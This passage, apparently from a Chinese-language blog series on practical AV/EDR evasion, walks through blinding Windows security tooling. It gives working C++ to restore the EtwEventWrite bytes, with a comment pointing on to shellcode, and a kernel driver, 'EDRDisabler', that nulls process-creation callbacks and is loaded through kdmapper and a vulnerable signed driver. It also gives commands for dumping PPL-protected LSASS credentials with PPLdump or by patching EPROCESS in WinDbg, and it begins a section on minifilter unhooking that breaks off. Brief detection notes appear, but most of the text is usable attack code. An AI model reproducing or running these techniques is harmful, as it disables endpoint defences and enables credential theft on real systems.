class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;TlHelp32.h&gt;</span></span><br><br><span class="hljs-comment">// 恢复EtwEventWrite的原始字节</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">UnhookEtwEventWrite</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 加载ntdll到内存</span><br>    HMODULE hNtdll = <span class="hljs-built_in">GetModuleHandleA</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!hNtdll) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;无法获取ntdll.dll句柄\n&quot;</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 查找EtwEventWrite函数地址</span><br>    <span class="hljs-type">void</span>* hookedFunc = <span class="hljs-built_in">GetProcAddress</span>(hNtdll, <span class="hljs-string">&quot;EtwEventWrite&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!hookedFunc) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;未找到EtwEventWrite\n&quot;</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 打开磁盘上ntdll.dll的只读映射</span><br>    HANDLE hFile = <span class="hljs-built_in">CreateFileA</span>(<span class="hljs-string">&quot;C:\\Windows\\System32\\ntdll.dll&quot;</span>, GENERIC_READ, FILE_SHARE_READ, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;无法从磁盘打开ntdll.dll\n&quot;</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    HANDLE hMapping = <span class="hljs-built_in">CreateFileMappingA</span>(hFile, <span class="hljs-literal">NULL</span>, PAGE_READONLY | SEC_IMAGE, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (!hMapping) &#123;<br>        <span class="hljs-built_in">CloseHandle</span>(hFile);<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;创建文件映射失败\n&quot;</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    LPVOID cleanBase = <span class="hljs-built_in">MapViewOfFile</span>(hMapping, FILE_MAP_READ, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (!cleanBase) &#123;<br>        <span class="hljs-built_in">CloseHandle</span>(hMapping);<br>        <span class="hljs-built_in">CloseHandle</span>(hFile);<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;映射ntdll失败\n&quot;</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 从映射的干净ntdll中获取EtwEventWrite</span><br>    <span class="hljs-type">void</span>* cleanFunc = <span class="hljs-built_in">GetProcAddress</span>((HMODULE)cleanBase, <span class="hljs-string">&quot;EtwEventWrite&quot;</span>);<br><br>    <span class="hljs-comment">// 打补丁覆盖前几个字节（通常16字节足够）</span><br>    DWORD oldProtect;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">VirtualProtect</span>(hookedFunc, <span class="hljs-number">16</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect)) &#123;<br>        <span class="hljs-built_in">memcpy</span>(hookedFunc, cleanFunc, <span class="hljs-number">16</span>);<br>        <span class="hljs-built_in">VirtualProtect</span>(hookedFunc, <span class="hljs-number">16</span>, oldProtect, &amp;oldProtect);<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;成功恢复EtwEventWrite\n&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;无法解保护钩住的函数内存\n&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 清理</span><br>    <span class="hljs-built_in">UnmapViewOfFile</span>(cleanBase);<br>    <span class="hljs-built_in">CloseHandle</span>(hMapping);<br>    <span class="hljs-built_in">CloseHandle</span>(hFile);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">UnhookEtwEventWrite</span>();<br><br>    <span class="hljs-comment">// 继续运行你的载荷或shellcode</span><br>    <span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;成功取消ETW钩子&quot;</span>, <span class="hljs-string">&quot;绕过&quot;</span>, MB_OK);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="检测风险："><a href="#检测风险：" class="headerlink" title="检测风险："></a><strong>检测风险：</strong></h3><ol>
<li><p><strong>YARA规则</strong>通常会扫描：</p>
<ul>
<li><p><code>0xC3</code>（<code>RET</code>）出现在<code>EtwEventWrite</code>的开头。</p>
</li>
<li><p>从原始NTDLL部分中修改的字节。</p>
</li>
</ul>
</li>
<li><p><strong>Defender ATP</strong>和<strong>CrowdStrike Falcon</strong>检查内存区域并检测内存补丁。</p>
</li>
<li><p><strong>取消钩子比补丁更隐蔽</strong>，但仍然可以通过运行时验证检测到。</p>
</li>
</ol>
<hr>
<p>链接：<a target="_blank" rel="noopener" href="https://github.com/0xflux/ETW-Bypass-Rust">https://github.com/0xflux/ETW-Bypass-Rust</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Kara-4search/BypassETW_CSharp">https://github.com/Kara-4search/BypassETW_CSharp</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Gurpreet06/ETW-Patcher">https://github.com/Gurpreet06/ETW-Patcher</a></p>
<h2 id="AV-EDR规避实战技巧-8-2-EDR的内核回调"><a href="#AV-EDR规避实战技巧-8-2-EDR的内核回调" class="headerlink" title="AV&#x2F;EDR规避实战技巧 - 8.2 - EDR的内核回调"></a>AV&#x2F;EDR规避实战技巧 - 8.2 - EDR的内核回调</h2><p><strong>目标</strong>：了解端点检测与响应（EDR）工具如何利用内核模式回调，并探索如何枚举、操控或注销这些回调来实现规避。</p>
<hr>
<h3 id="什么是内核回调？"><a href="#什么是内核回调？" class="headerlink" title="什么是内核回调？"></a>什么是内核回调？</h3><p>在Windows中，内核模式回调允许驱动程序（包括EDR驱动）注册对某些系统级事件的关注。这些回调功能强大，常用于：</p>
<ul>
<li><p>监控<strong>进程创建</strong>（<code>PsSetCreateProcessNotifyRoutine</code>）</p>
</li>
<li><p>监控<strong>线程创建</strong>（<code>PsSetCreateThreadNotifyRoutine</code>）</p>
</li>
<li><p>监控<strong>映像加载</strong>（<code>PsSetLoadImageNotifyRoutine</code>）</p>
</li>
<li><p>监控<strong>注册表活动</strong>（<code>CmRegisterCallbackEx</code>）</p>
</li>
</ul>
<p>这些回调通常被EDR用来在用户模式启动之前就获得系统活动的可见性。</p>
<hr>
<h3 id="为什么要规避内核回调？"><a href="#为什么要规避内核回调？" class="headerlink" title="为什么要规避内核回调？"></a>为什么要规避内核回调？</h3><p>EDR使用这些回调来：</p>
<ul>
<li><p>记录或阻止可疑的进程或模块。</p>
</li>
<li><p>在威胁展开之前钩住或分析执行。</p>
</li>
<li><p>在内核空间中关联行为，避免错过一些信息。</p>
</li>
</ul>
<p>为了避免被检测到：</p>
<ul>
<li><p>恶意软件尝试<strong>枚举</strong>或<strong>禁用</strong>这些回调。</p>
</li>
<li><p>高级技术涉及<strong>绕过EDR驱动保护</strong>，或<strong>注销回调</strong>。</p>
</li>
</ul>
<hr>
<h3 id="EDR如何实现回调（内部原理）"><a href="#EDR如何实现回调（内部原理）" class="headerlink" title="EDR如何实现回调（内部原理）"></a>EDR如何实现回调（内部原理）</h3><p>EDR驱动通过如下API注册回调：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">NTSTATUS <span class="hljs-title function_">PsSetCreateProcessNotifyRoutine</span><span class="hljs-params">(PCREATE_PROCESS_NOTIFY_ROUTINE NotifyRoutine, BOOLEAN Remove)</span>;<br>NTSTATUS <span class="hljs-title function_">PsSetCreateThreadNotifyRoutine</span><span class="hljs-params">(PCREATE_THREAD_NOTIFY_ROUTINE NotifyRoutine)</span>;<br>NTSTATUS <span class="hljs-title function_">PsSetLoadImageNotifyRoutine</span><span class="hljs-params">(PLOAD_IMAGE_NOTIFY_ROUTINE NotifyRoutine)</span>;<br></code></pre></td></tr></table></figure>

<p>这些API注册指向函数的指针，在进程&#x2F;线程&#x2F;映像事件发生时会被调用。</p>
<hr>
<h3 id="如何枚举或禁用EDR回调"><a href="#如何枚举或禁用EDR回调" class="headerlink" title="如何枚举或禁用EDR回调"></a>如何枚举或禁用EDR回调</h3><h3 id="方法1-使用易受攻击的驱动（BYOVD）"><a href="#方法1-使用易受攻击的驱动（BYOVD）" class="headerlink" title="方法1 - 使用易受攻击的驱动（BYOVD）"></a><strong>方法1 - 使用易受攻击的驱动（BYOVD）</strong></h3><p>一种技术被称为<strong>自带易受攻击的驱动（BYOVD）</strong>，用于获取内核级权限并枚举或操控回调条目。</p>
<h4 id="示例：使用MSI的RTCore64-sys（已知易受攻击的驱动）"><a href="#示例：使用MSI的RTCore64-sys（已知易受攻击的驱动）" class="headerlink" title="示例：使用MSI的RTCore64.sys（已知易受攻击的驱动）"></a>示例：使用MSI的<code>RTCore64.sys</code>（已知易受攻击的驱动）</h4><ol>
<li><p>加载一个易受攻击的驱动程序。</p>
</li>
<li><p>访问未公开的内核结构，如<code>PspCreateProcessNotifyRoutine</code>。</p>
</li>
<li><p>读取并将函数指针置为空来禁用回调。</p>
</li>
</ol>
<blockquote>
<p><strong>注意</strong>：此方法非常危险，如果执行不当，可能会导致系统崩溃。需要了解Windows内部原理。</p>
</blockquote>
<hr>
<h3 id="PoC使用KDMapper-自定义驱动"><a href="#PoC使用KDMapper-自定义驱动" class="headerlink" title="PoC使用KDMapper + 自定义驱动"></a><strong>PoC使用KDMapper + 自定义驱动</strong></h3><p>通过使用<a target="_blank" rel="noopener" href="https://github.com/TheCruZ/kdmapper">kdmapper</a>，我们可以映射一个驱动程序，扫描<code>PspCreateProcessNotifyRoutine</code>表并禁用回调。</p>
<h3 id="内核驱动伪代码："><a href="#内核驱动伪代码：" class="headerlink" title="内核驱动伪代码："></a>内核驱动伪代码：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 需要Windows内部知识</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">DisableEDRProcessCallbacks</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">64</span>; i++)<br>    &#123;<br>        PVOID* CallbackEntry = (PVOID*)((ULONG_PTR)PspCreateProcessNotifyRoutine + (i * <span class="hljs-keyword">sizeof</span>(PVOID)));<br>        <span class="hljs-keyword">if</span> (MmIsAddressValid(*CallbackEntry))<br>        &#123;<br>            *CallbackEntry = <span class="hljs-literal">NULL</span>;  <span class="hljs-comment">// 禁用回调</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="注意：-1"><a href="#注意：-1" class="headerlink" title="注意："></a>注意：</h3><ul>
<li><p>这段代码必须在<strong>内核模式</strong>下运行。</p>
</li>
<li><p><code>PspCreateProcessNotifyRoutine</code>的地址必须动态解析或使用符号。</p>
</li>
</ul>
<hr>
<h3 id="检测与反制措施"><a href="#检测与反制措施" class="headerlink" title="检测与反制措施"></a>检测与反制措施</h3><p>EDR和现代Windows防御使用以下方法反制这种类型的规避：</p>
<ul>
<li><p><strong>HVCI（虚拟机保护的代码完整性）</strong>：防止内核内存篡改。</p>
</li>
<li><p><strong>回调验证</strong>：检查是否存在意外的空条目。</p>
</li>
<li><p><strong>篡改保护</strong>：防止加载未签名驱动或没有适当策略的驱动。</p>
</li>
</ul>
<hr>
<h3 id="更安全的枚举工具（只读）"><a href="#更安全的枚举工具（只读）" class="headerlink" title="更安全的枚举工具（只读）"></a>更安全的枚举工具（只读）</h3><p>如果你处于测试或研究环境中，且希望<strong>枚举回调</strong>而不进行修改，可以使用：</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://github.com/wavestone-cdt/EDRSandblast">EDRSandblast</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/hfiref0x/KDU">KDU</a> - 内核驱动工具，用于映射内核内存</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://processhacker.sourceforge.io/">Process Hacker（带插件）</a></p>
</li>
</ul>
<hr>
<h3 id="实际使用-1"><a href="#实际使用-1" class="headerlink" title="实际使用"></a>实际使用</h3><p>恶意软件如<strong>Turla</strong>、<strong>FIN7</strong>和<strong>Conti</strong>已经使用内核级篡改来绕过EDR，通过：</p>
<ul>
<li><p>禁用内核回调。</p>
</li>
<li><p>杀死EDR驱动。</p>
</li>
<li><p>使用BYOVD修改回调表。</p>
</li>
</ul>
<hr>
<h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><table>
<thead>
<tr>
<th>技术</th>
<th>需要内核访问</th>
<th>风险等级</th>
<th>可检测性</th>
</tr>
</thead>
<tbody><tr>
<td>回调打补丁（NULL）</td>
<td>是（BYOVD）</td>
<td>高</td>
<td>高</td>
</tr>
<tr>
<td>枚举回调</td>
<td>是</td>
<td>中</td>
<td>低</td>
</tr>
<tr>
<td>通过API移除</td>
<td>仅限自己的回调</td>
<td>低</td>
<td>高</td>
</tr>
</tbody></table>
<hr>
<h3 id="PoC：通过内核内存篡改禁用EDR进程回调"><a href="#PoC：通过内核内存篡改禁用EDR进程回调" class="headerlink" title="PoC：通过内核内存篡改禁用EDR进程回调"></a>PoC：通过内核内存篡改禁用EDR进程回调</h3><h3 id="技术：通过内核模式访问将PspCreateProcessNotifyRoutine数组中的条目置为NULL。"><a href="#技术：通过内核模式访问将PspCreateProcessNotifyRoutine数组中的条目置为NULL。" class="headerlink" title="技术：通过内核模式访问将PspCreateProcessNotifyRoutine数组中的条目置为NULL。"></a>技术：通过内核模式访问将<code>PspCreateProcessNotifyRoutine</code>数组中的条目置为NULL。</h3><blockquote>
<p><strong>注意</strong>：这些结构是未公开的，并且在不同版本的Windows之间有所不同。我们将使用符号解析来获取<code>PspCreateProcessNotifyRoutine</code>的地址。</p>
</blockquote>
<hr>
<h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><ul>
<li><p>一个<strong>易受攻击的签名驱动</strong>（例如，<code>RTCore64.sys</code>或<code>ASUSGPU.sys</code>）</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/TheCruZ/kdmapper">kdmapper</a>：使用现有的易受攻击驱动加载未签名的内核驱动。</p>
</li>
<li><p>一个自定义<strong>驱动程序（<code>EDRDisabler.sys</code>）</strong>，用于将回调指针置空。</p>
</li>
<li><p>配置了Windows Defender + EDR（CrowdStrike，SentinelOne等）的测试环境。</p>
</li>
</ul>
<hr>
<h3 id="步骤1-–-自定义驱动代码（EDRDisabler-cpp）"><a href="#步骤1-–-自定义驱动代码（EDRDisabler-cpp）" class="headerlink" title="步骤1 – 自定义驱动代码（EDRDisabler.cpp）"></a>步骤1 – 自定义驱动代码（EDRDisabler.cpp）</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ntddk.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_CALLBACK_ENTRY</span> &#123;<br>    LIST_ENTRY CallbackList;<br>    PVOID Function;<br>    PVOID Context;<br>&#125; CALLBACK_ENTRY, * PCALLBACK_ENTRY;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> PVOID PsSetCreateProcessNotifyRoutine;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">DisableProcessCallbacks</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">DbgPrint</span>(<span class="hljs-string">&quot;[*] 尝试禁用进程创建回调...\n&quot;</span>);<br><br>    <span class="hljs-comment">// 获取数组指针</span><br>    PVOID* PspCreateProcessNotifyRoutine = (PVOID*)PsSetCreateProcessNotifyRoutine;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">64</span>; i++) <span class="hljs-comment">// 最多64个条目</span><br>    &#123;<br>        PVOID entry = <span class="hljs-built_in">InterlockedExchangePointer</span>(&amp;PspCreateProcessNotifyRoutine[i], <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">if</span> (entry != <span class="hljs-literal">NULL</span>)<br>        &#123;<br>            <span class="hljs-built_in">DbgPrint</span>(<span class="hljs-string">&quot;[+] 回调 %d 被移除: %p\n&quot;</span>, i, entry);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function">NTSTATUS <span class="hljs-title">DriverEntry</span><span class="hljs-params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">UNREFERENCED_PARAMETER</span>(RegistryPath);<br>    DriverObject-&gt;DriverUnload = [](PDRIVER_OBJECT) &#123;&#125;;<br><br>    <span class="hljs-built_in">DisableProcessCallbacks</span>();<br><br>    <span class="hljs-keyword">return</span> STATUS_SUCCESS;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="注意：-2"><a href="#注意：-2" class="headerlink" title="注意："></a>注意：</h3><ul>
<li><p><code>PsSetCreateProcessNotifyRoutine</code>并不直接导出。你需要手动解析它，或者使用WinDbg通过符号提取它的地址。</p>
</li>
<li><p>你还可以使用符号名称<code>nt!PspCreateProcessNotifyRoutine</code>来定位数组。</p>
</li>
</ul>
<hr>
<h3 id="步骤2-–-使用Kdmapper映射驱动"><a href="#步骤2-–-使用Kdmapper映射驱动" class="headerlink" title="步骤2 – 使用Kdmapper映射驱动"></a>步骤2 – 使用Kdmapper映射驱动</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kdmapper.exe EDRDisabler.sys<br></code></pre></td></tr></table></figure>

<p>驱动映射后，它会尝试将进程回调数组中的所有条目置为NULL。</p>
<hr>
<h3 id="使用WinDbg进行符号解析"><a href="#使用WinDbg进行符号解析" class="headerlink" title="使用WinDbg进行符号解析"></a>使用WinDbg进行符号解析</h3><p>在WinDbg中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs windbg">x nt!PspCreateProcessNotifyRoutine<br></code></pre></td></tr></table></figure>

<p>这将给出回调数组在内核内存中的地址。</p>
<hr>
<h3 id="实际案例：为什么这个方法有效"><a href="#实际案例：为什么这个方法有效" class="headerlink" title="实际案例：为什么这个方法有效"></a>实际案例：为什么这个方法有效</h3><p>EDR注册它们的驱动时使用<code>PsSetCreateProcessNotifyRoutineEx</code>。它们的回调函数存储在这个全局数组中。通过将它们的函数指针设置为<code>NULL</code>，你可以有效地禁用它们对新进程的可见性，而不会导致操作系统崩溃。</p>
<p>一些恶意软件家族，如<strong>Turla</strong>和<strong>Slingshot</strong>，已经成功使用了此技术，通常会加载自己的内核驱动来执行这些操作。</p>
<hr>
<h3 id="参考资料-1"><a href="#参考资料-1" class="headerlink" title="参考资料"></a>参考资料</h3><ul>
<li><p><a target="_blank" rel="noopener" href="https://github.com/hfiref0x/KDU">KDU - 内核驱动工具</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/wavestone-cdt/EDRSandblast">EDRSandblast</a></p>
</li>
<li><p>《Windows内部原理》第7版 - Mark Russinovich</p>
</li>
<li><p>WinDbg和PDB符号用于内核分析</p>
</li>
</ul>
<h2 id="AV-EDR规避实战技巧-8-3-Dumping-LSA-Protected-LSASS"><a href="#AV-EDR规避实战技巧-8-3-Dumping-LSA-Protected-LSASS" class="headerlink" title="AV&#x2F;EDR规避实战技巧 - 8.3 - Dumping LSA Protected LSASS"></a>AV&#x2F;EDR规避实战技巧 - 8.3 - Dumping LSA Protected LSASS</h2><h3 id="目标-1"><a href="#目标-1" class="headerlink" title="目标"></a><strong>目标</strong></h3><p>绕过<strong>LSA保护</strong>（也称为PPL – 受保护进程轻量版）从<code>lsass.exe</code>（本地安全授权子系统服务）中转储内存，并绕过AV&#x2F;EDR的文件系统检测机制，如AV&#x2F;EDR的minifilter回调。</p>
<hr>
<h3 id="1-理解PPL（受保护进程轻量版）"><a href="#1-理解PPL（受保护进程轻量版）" class="headerlink" title="1. 理解PPL（受保护进程轻量版）"></a><strong>1. 理解PPL（受保护进程轻量版）</strong></h3><p>PPL是Windows 8.1及以上版本中的一项安全特性，它阻止了即使是系统级别的进程访问敏感进程（如<code>lsass.exe</code>），除非这些进程也被标记为与LSASS具有相同的“受信任”<strong>保护级别</strong>。</p>
<p>当使用工具如<strong>Mimikatz</strong>时，你可能会遇到以下错误：</p>
<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit">mimikatz # sekurlsa::logonpasswords<br><span class="hljs-keyword">ERROR </span>kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)<br></code></pre></td></tr></table></figure>

<p>发生这种情况的原因是：</p>
<ul>
<li><p>你的进程（即使是SYSTEM进程）没有与LSASS相同的<strong>PS_PROTECTION</strong>级别的信任。</p>
</li>
<li><p>LSASS在其EPROCESS结构中使用了一个字段来声明其保护。</p>
</li>
</ul>
<hr>
<h3 id="2-绕过LSA保护"><a href="#2-绕过LSA保护" class="headerlink" title="2. 绕过LSA保护"></a><strong>2. 绕过LSA保护</strong></h3><h3 id="选项A-–-使用PPLdump-exe（用户态漏洞）"><a href="#选项A-–-使用PPLdump-exe（用户态漏洞）" class="headerlink" title="选项A – 使用PPLdump.exe（用户态漏洞）"></a><strong>选项A – 使用<code>PPLdump.exe</code>（用户态漏洞）</strong></h3><p><a target="_blank" rel="noopener" href="https://github.com/itm4n/PPLdump">PPLdump</a>允许你<strong>无需内核级驱动或EPROCESS补丁</strong>，直接转储LSASS。</p>
<h3 id="描述："><a href="#描述：" class="headerlink" title="描述："></a><strong>描述</strong>：</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">使用*用户态*漏洞转储受保护进程（PPL）的内存<br></code></pre></td></tr></table></figure>

<h3 id="语法："><a href="#语法：" class="headerlink" title="语法："></a><strong>语法</strong>：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">PPLdump.exe [-v] [-d] [-f] &lt;PROC_NAME|PROC_ID&gt; &lt;DUMP_FILE&gt;<br></code></pre></td></tr></table></figure>

<h3 id="示例：-2"><a href="#示例：-2" class="headerlink" title="示例："></a><strong>示例</strong>：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">PPLdump.exe -v lsass.exe lsass.dmp<br></code></pre></td></tr></table></figure>

<p>该方法通过生成一个<strong>牺牲子进程</strong>，继承句柄以绕过保护层。</p>
<hr>
<h3 id="选项B-–-内核级EPROCESS补丁（WinDbg）"><a href="#选项B-–-内核级EPROCESS补丁（WinDbg）" class="headerlink" title="选项B – 内核级EPROCESS补丁（WinDbg）"></a><strong>选项B – 内核级EPROCESS补丁（WinDbg）</strong></h3><ol>
<li><strong>定位LSASS EPROCESS</strong>：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs windbg">!process 0 0 lsass.exe<br></code></pre></td></tr></table></figure>

<ol start="2">
<li><strong>获取保护字段</strong>：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs windbg">dt nt!_EPROCESS &lt;lsass_EPROCESS&gt; Protection<br></code></pre></td></tr></table></figure>

<ol start="3">
<li><strong>移除PPL（将保护字段设置为0）</strong>：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs windbg">eb &lt;lsass_EPROCESS&gt;+&lt;Offset_Protection&gt; 0x00<br></code></pre></td></tr></table></figure>

<p>你可以使用以下命令来获取<code>Protection</code>的偏移：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs windbg">dt nt!_PS_PROTECTION<br></code></pre></td></tr></table></figure>

<p>一旦移除PPL，你就可以使用<code>procdump</code>、<code>mimikatz</code>或类似工具来转储LSASS。</p>
<hr>
<h3 id="3-Minifilter回调解除钩子（绕过基于文件的EDR检测）"><a href="#3-Minifilter回调解除钩子（绕过基于文件的EDR检测）" class="headerlink" title="3. Minifilter回调解除钩子（绕过基于文件的EDR检测）"></a><strong>3. Minifilter回调解除钩子（绕过基于文件的EDR检测）</strong></h3><p>像<code>mimikatz.exe</code>这样的恶意软件经常在执行之前被磁盘上的AV&#x2F;EDR<strong>Minifilter回调</strong>检测到。</p>
<h3 id="工作原理-1"><a href="#工作原理-1" class="headerlink" title="工作原理"></a><strong>工作原理</strong></h3><ul>
<li><p>Windows使用<code>FLT_INSTANCE</code>结构表示已加载的minifilter驱动程序。</p>
</li>
<li><p>每个实例有<code>CALLBACK_NODE</code>，用于表示文件创建、读取或写入等事件。</p>
</li>
<li><p>这些节点通过<code>_LIST_ENTRY</code>形成一个双向链表。</p>
</li>
</ul>
<h3 id="绕过文件检测"><a href="#绕过文件检测" class="headerlink" title="绕过文件检测"></a><strong>绕过文件检测</strong></h3><p>使用内核调试器（例如WinDbg）：</p>
<ol>
<li><strong>列出过滤器</strong>：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs windbg">!fltkd.filters<br></code></pre></td></tr></table></figure>

<ol start="2">
<li><strong>检查过滤器实例</strong>：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs windbg">!instance &lt;FLT_INSTANCE_ADDRESS&gt; 4<br></code></pre></td></tr></table></figure>

<ol start="3">
<li><strong>检查回调节点</strong>：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs windbg">dt _CALLBACK_NODE &lt;CallbackNode_Addr&gt;<br></code></pre></td></tr></table></figure>

<p>要解除回调钩子（禁用遥测）：</p>
